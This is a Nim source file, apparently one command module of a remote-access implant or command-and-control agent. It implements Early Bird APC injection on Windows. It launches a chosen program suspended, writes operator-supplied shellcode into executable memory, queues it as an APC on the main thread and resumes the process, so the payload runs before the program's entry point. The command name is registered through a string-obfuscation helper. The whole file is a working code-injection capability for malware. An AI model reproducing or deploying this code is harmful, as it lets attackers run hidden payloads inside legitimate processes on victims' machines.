## earlybird — Early Bird APC injection (Windows only).
## Spawns a process in suspended state, writes shellcode via VirtualAllocEx +
## WriteProcessMemory, queues an APC to the main thread, then resumes it.
## The shellcode executes before the process entry point is ever called.
import std/[base64, json]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  # ---------------------------------------------------------------------------
  # Windows API types
  # ---------------------------------------------------------------------------
  type
    HANDLE    = int
    DWORD     = uint32
    BOOL      = int32
    LPVOID    = pointer
    SIZE_T    = uint
    ULONG_PTR = uint

    STARTUPINFOA {.pure.} = object
      cb:             DWORD
      lpReserved:     cstring
      lpDesktop:      cstring
      lpTitle:        cstring
      dwX:            DWORD
      dwY:            DWORD
      dwXSize:        DWORD
      dwYSize:        DWORD
      dwXCountChars:  DWORD
      dwYCountChars:  DWORD
      dwFillAttribute:DWORD
      dwFlags:        DWORD
      wShowWindow:    uint16
      cbReserved2:    uint16
      lpReserved2:    ptr uint8
      hStdInput:      HANDLE
      hStdOutput:     HANDLE
      hStdError:      HANDLE

    PROCESS_INFORMATION {.pure.} = object
      hProcess:    HANDLE
      hThread:     HANDLE
      dwProcessId: DWORD
      dwThreadId:  DWORD

  const
    CREATE_SUSPENDED       = DWORD(0x00000004)
    MEM_COMMIT             = DWORD(0x00001000)
    MEM_RESERVE            = DWORD(0x00002000)
    PAGE_EXECUTE_READWRITE = DWORD(0x40)

  # ---------------------------------------------------------------------------
  # Windows API imports
  # ---------------------------------------------------------------------------
  proc CreateProcessA(
    lpApplicationName:    cstring,
    lpCommandLine:        cstring,
    lpProcessAttributes:  pointer,
    lpThreadAttributes:   pointer,
    bInheritHandles:      BOOL,
    dwCreationFlags:      DWORD,
    lpEnvironment:        pointer,
    lpCurrentDirectory:   cstring,
    lpStartupInfo:        ptr STARTUPINFOA,
    lpProcessInformation: ptr PROCESS_INFORMATION
  ): BOOL {.importc: "CreateProcessA", dynlib: "kernel32".}

  proc VirtualAllocEx(
    hProcess:          HANDLE,
    lpAddress:         LPVOID,
    dwSize:            SIZE_T,
    flAllocationType:  DWORD,
    flProtect:         DWORD
  ): LPVOID {.importc: "VirtualAllocEx", dynlib: "kernel32".}

  proc WriteProcessMemory(
    hProcess:                HANDLE,
    lpBaseAddress:           LPVOID,
    lpBuffer:                pointer,
    nSize:                   SIZE_T,
    lpNumberOfBytesWritten:  ptr SIZE_T
  ): BOOL {.importc: "WriteProcessMemory", dynlib: "kernel32".}

  proc QueueUserAPC(
    pfnAPC:  LPVOID,
    hThread: HANDLE,
    dwData:  ULONG_PTR
  ): DWORD {.importc: "QueueUserAPC", dynlib: "kernel32".}

  proc ResumeThread(hThread: HANDLE): DWORD
    {.importc: "ResumeThread", dynlib: "kernel32".}

  proc CloseHandle(hObject: HANDLE): BOOL
    {.importc: "CloseHandle", dynlib: "kernel32".}

# ---------------------------------------------------------------------------

proc earlybirdExecute(taskId: string, params: JsonNode, state: AgentState,
                      send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: "earlybird is Windows-only", status: "error",
                      completed: true)
  else:
    let processPath  = params{"process"}.getStr("")
    let shellcodeB64 = params{"shellcode"}.getStr("")

    if processPath.len == 0:
      return TaskResult(output: "Error: process parameter required",
                        status: "error", completed: true)
    if shellcodeB64.len == 0:
      return TaskResult(output: "Error: shellcode parameter required",
                        status: "error", completed: true)

    # Decode shellcode
    var shellcode: seq[byte]
    try:
      let decoded = decode(shellcodeB64)
      shellcode = newSeq[byte](decoded.len)
      for i, c in decoded:
        shellcode[i] = byte(ord(c))
    except Exception as e:
      return TaskResult(output: "Error decoding shellcode: " & e.msg,
                        status: "error", completed: true)

    if shellcode.len == 0:
      return TaskResult(output: "Error: empty shellcode after decode",
                        status: "error", completed: true)

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    si.cb = DWORD(sizeof(STARTUPINFOA))

    # 1. Spawn target process in suspended state
    let created = CreateProcessA(
      nil,
      processPath.cstring,
      nil, nil,
      BOOL(0),
      CREATE_SUSPENDED,
      nil, nil,
      addr si,
      addr pi
    )
    if created == 0:
      return TaskResult(
        output: "Error: CreateProcessA failed for '" & processPath & "'",
        status: "error", completed: true)

    # 2. Allocate RWX memory in target process
    let remoteMem = VirtualAllocEx(
      pi.hProcess,
      nil,
      SIZE_T(shellcode.len),
      MEM_COMMIT or MEM_RESERVE,
      PAGE_EXECUTE_READWRITE
    )
    if remoteMem == nil:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: "Error: VirtualAllocEx failed",
                        status: "error", completed: true)

    # 3. Write shellcode into target
    var bytesWritten: SIZE_T = 0
    let written = WriteProcessMemory(
      pi.hProcess,
      remoteMem,
      addr shellcode[0],
      SIZE_T(shellcode.len),
      addr bytesWritten
    )
    if written == 0:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: "Error: WriteProcessMemory failed",
                        status: "error", completed: true)

    # 4. Queue APC pointing to shellcode on the main (suspended) thread
    let apcQueued = QueueUserAPC(remoteMem, pi.hThread, ULONG_PTR(0))
    if apcQueued == 0:
      discard CloseHandle(pi.hThread)
      discard CloseHandle(pi.hProcess)
      return TaskResult(output: "Error: QueueUserAPC failed",
                        status: "error", completed: true)

    # 5. Resume — shellcode runs before entry point (Early Bird)
    discard ResumeThread(pi.hThread)

    discard CloseHandle(pi.hThread)
    discard CloseHandle(pi.hProcess)

    return TaskResult(
      output:    "Early Bird injection complete — PID " & $pi.dwProcessId &
                 " (" & processPath & "), " & $shellcode.len & " bytes",
      status:    "success",
      completed: true,
    )

proc initEarlyBird*() =
  register(hidstr("earlybird"), earlybirdExecute)
